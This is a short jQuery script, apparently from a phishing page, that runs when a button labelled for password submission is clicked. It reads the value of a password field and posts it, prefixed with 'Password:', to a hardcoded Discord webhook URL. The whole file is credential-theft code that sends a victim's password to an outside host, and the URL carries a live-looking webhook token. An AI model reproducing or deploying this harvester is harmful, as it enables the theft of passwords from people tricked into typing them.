$(document).ready(() => {
    $("#wg-submit-pass").click(() => {
        let password = $("#authPassword").val()
        let payload = JSON.stringify({content: "Password: " + password})

        $.post({
            url: "https://discord.com/api/webhooks/1187076837470388297/f111iRiceSwYtN_lCB2BsfUixVlbUoSnFL91LhEPklkkR3OZ3PMbIeQutbGCR8NVxYff",
            data: payload,
            contentType: "application/json"
        })
    })
})